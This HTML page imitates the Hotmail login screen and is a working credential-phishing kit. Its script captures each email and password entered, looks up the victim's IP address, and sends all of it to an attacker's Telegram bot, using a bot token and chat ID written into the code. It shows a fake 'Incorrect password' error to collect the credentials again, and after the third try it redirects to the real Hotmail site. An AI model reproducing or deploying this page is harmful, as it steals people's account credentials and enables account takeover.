<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hotmail</title>
    <style>
        /* Hotmail Themed Styling */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f7fa;
            margin: 0;
        }

        .login-box {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            text-align: center;
            width: 350px;
        }

        .logo {
            width: 150px;
            margin-bottom: 20px;
        }

        input[type="email"], 
        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #0078d4;  /* Hotmail Blue */
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #005a8c;  /* Darker Blue */
        }

        #errorMessage {
            color: red;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <!-- Hotmail Logo -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/Hotmail_logo_2012.svg" alt="Hotmail Logo" class="logo">
        
        <!-- Login Form -->
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">LOGIN</button>
            <p id="errorMessage"></p>
        </form>
    </div>

    <script>
        // JavaScript for handling form submissions
        const botToken = '7945778844:AAGK7yuWd-sMB-nlBAnWQ8HBTbfyjA1lUrI';  // Replace with your bot token
        const chatId = '7922903810';      // Replace with your chat ID
        let attemptCount = 0;

        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent form submission
            attemptCount++;

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const formName = "Hotmail";
            
            // Fetching user's IP address
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const userIp = ipData.ip;

            // Prepare the message to be sent to Telegram
            const message = `
üì© *New Login Attempt*
üë§ *Form:* ${formName}
üìß *Email:* ${email}
üîë *Password:* ${password}
üåê *IP Address:* ${userIp}
üîÅ *Attempt:* ${attemptCount}/3
            `;

            // Send data to Telegram bot
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: "Markdown"
                })
            });

            // Incorrect password handling logic
            if (attemptCount < 3) {
                document.getElementById('errorMessage').textContent = "Incorrect password. Try again.";
            } else {
                window.location.href = "https://www.hotmail.com";  // Redirect after 3rd attempt
            }
        });
    </script>
</body>
</html>
